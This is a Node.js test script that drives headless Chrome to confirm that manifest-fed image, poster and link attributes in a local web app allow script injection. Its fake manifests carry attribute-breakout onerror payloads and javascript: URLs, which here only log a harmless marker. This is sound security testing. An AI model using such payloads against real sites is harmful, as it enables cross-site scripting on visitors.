/* Confirms the two manifest-fed sinks actually execute:
   1. ds.js photo strip: e.file straight into src="..."  -> attribute breakout, onerror fires once the img is in view
   2. ds.js credit link: esc(e.url) into href="..."      -> javascript: survives escaping, fires on click
   3. mobile.js reel: it.video.poster / it.video.v / p.ava straight into poster=/src= */
import { spawn } from 'node:child_process'
import { rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
const port = 9500 + Math.floor(Math.random() * 90)
const chrome = spawn('C:/Program Files/Google/Chrome/Application/chrome.exe', [
  '--headless=new', '--disable-gpu', '--hide-scrollbars', '--no-first-run',
  '--force-prefers-reduced-motion=no-preference', `--remote-debugging-port=${port}`,
  `--user-data-dir=${join(tmpdir(), 'xc' + port)}`, '--window-size=1440,1000', 'about:blank',
], { stdio: 'ignore' })
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let t
for (let i = 0; i < 120 && !t; i++) { try { t = (await (await fetch(`http://127.0.0.1:${port}/json`)).json()).find((x) => x.type === 'page') } catch { await sleep(150) } }
const ws = new WebSocket(t.webSocketDebuggerUrl)
await new Promise((r) => ws.addEventListener('open', r, { once: true }))
let id = 0; const pend = new Map(); const errs = []
ws.addEventListener('message', (e) => {
  const m = JSON.parse(e.data)
  if (m.id && pend.has(m.id)) { pend.get(m.id)(m); pend.delete(m.id) }
  else if (m.method === 'Runtime.exceptionThrown') errs.push(String(m.params.exceptionDetails?.exception?.description).slice(0, 160))
})
const send = (m, p = {}) => new Promise((r) => { const n = ++id; const to = setTimeout(() => { pend.delete(n); r({ __timeout: m }) }, 15000); pend.set(n, (v) => { clearTimeout(to); r(v) }); ws.send(JSON.stringify({ id: n, method: m, params: p })) })
const js = async (e) => (await send('Runtime.evaluate', { expression: e, awaitPromise: true, returnByValue: true })).result?.result?.value
await send('Runtime.enable'); await send('Page.enable')
await send('Emulation.setDeviceMetricsOverride', { width: 1440, height: 1000, deviceScaleFactor: 1, mobile: false })

const photo = [
  // a crowd shoot whose ONLY portrait carries the payload: reel.js picks it as the avatar
  { file: 'evil.jpg" onerror="window.__pwnPush(\'reel-ava\')" x="', subject: 'boxer', player: 'crowd-z', tags: ['man'], focal: '50% 30%', photographer: 'P', url: 'javascript:window.__pwnPush("photo-url")', source: 'Pexels' },
  { file: 'evil2.jpg" onerror="window.__pwnPush(\'photo-file\')" x="', subject: 'strike', player: 'crowd-z', tags: ['man'], focal: '50% 30%', photographer: 'P', url: 'javascript:window.__pwnPush("photo-url")', source: 'Pexels' },
  { file: 'evil3.jpg', subject: 'strike', player: 'crowd-z', tags: ['man'], focal: '50% 30%', photographer: 'P', url: 'https://example.com', source: 'Pexels' },
]
const video = [{ name: 'jab-pass', who: 'x', subject: 'strike', v: 'a.mp4', v_poster: 'p.jpg" onerror="window.__pwnPush(\'reel-poster\')" x="', focal_v: '50% 50%', duration: 4, strike: 1, url: 'https://example.com', photographer: 'C', source: 'Pexels' }]
const boot = `window.__pwn = []; window.__pwnPush = (t) => { window.__pwn.push(t); return 1 };
(() => { const real = window.fetch.bind(window);
  const PHOTO = ${JSON.stringify(JSON.stringify(photo))}, VIDEO = ${JSON.stringify(JSON.stringify(video))};
  window.fetch = (u, o) => { const s = String(u && u.url ? u.url : u);
    if (s.indexOf('photos/lib/manifest.json') >= 0) return Promise.resolve(new Response(PHOTO, { status: 200, headers: { 'content-type': 'application/json' } }));
    if (s.indexOf('video/lib/manifest.json') >= 0) return Promise.resolve(new Response(VIDEO, { status: 200, headers: { 'content-type': 'application/json' } }));
    return real(u, o) } })();`
await send('Page.addScriptToEvaluateOnNewDocument', { source: boot })
await send('Page.navigate', { url: 'http://localhost:5770/' }); await sleep(6000)
await js('localStorage.clear(); 1')
await send('Page.navigate', { url: 'http://localhost:5770/' }); await sleep(6000)

const out = {}
await js(`window.showcase.mode('mobile'); 1`); await sleep(1000)
await js(`window.punchApp.go('reel'); 1`); await sleep(5000)
// page through the reel so the library players' slides are drawn
await js(`(async () => { for (let k = 0; k < 14; k++) { window.punchReel && window.punchReel.next && window.punchReel.next(); await new Promise(r => setTimeout(r, 260)) } })()`)
await sleep(3000)
out.reelExecuted = await js('JSON.stringify(window.__pwn)')
out.reelBrokenAttrs = await js(`JSON.stringify([...document.querySelectorAll('#mReelTrack [onerror], #mReelGridList [onerror]')].slice(0,4).map(n => n.outerHTML.slice(0,200)))`)

await js(`window.showcase.mode('ds'); 1`); await sleep(3000)
await js(`(async () => { for (let y = 0; y < document.documentElement.scrollHeight; y += 500) { scrollTo(0, y); await new Promise(r => setTimeout(r, 80)) } })()`)
await sleep(3000)
// force every lazy photo into view and let the 404 fire the injected onerror
out.scrolledStrip = await js(`(() => { const s = document.querySelector('[data-ds-photos]'); if (!s) return 'no strip'; s.scrollLeft = 0; const li = s.querySelector('li'); if (li) li.scrollIntoView({ block: 'center' }); const imgs = [...s.querySelectorAll('img')]; imgs.forEach(i => i.loading = 'eager'); return imgs.length })()`)
await sleep(3000)
out.dsExecuted = await js('JSON.stringify(window.__pwn)')
out.dsBrokenAttrs = await js(`JSON.stringify([...document.querySelectorAll('[data-ds-photos] [onerror]')].slice(0,3).map(n => n.outerHTML.slice(0,200)))`)
out.jsHrefs = await js(`JSON.stringify([...document.querySelectorAll('a[href^="javascript:"]')].map(a => a.getAttribute('href')))`)
// click the credit link the way a visitor would
out.clicked = await js(`(() => { const a = document.querySelector('[data-ds-photos] a[href^="javascript:"]'); if (!a) return 'none'; a.click(); return a.getAttribute('href') })()`)
await sleep(1200)
out.afterClick = await js('JSON.stringify(window.__pwn)')
out.errors = errs.slice(0, 6)
console.log(JSON.stringify(out, null, 1))
ws.close(); chrome.kill(); setTimeout(() => { try { rmSync(join(tmpdir(), 'xc' + port), { recursive: true, force: true }) } catch { /* still held */ } }, 600); process.exit(0)
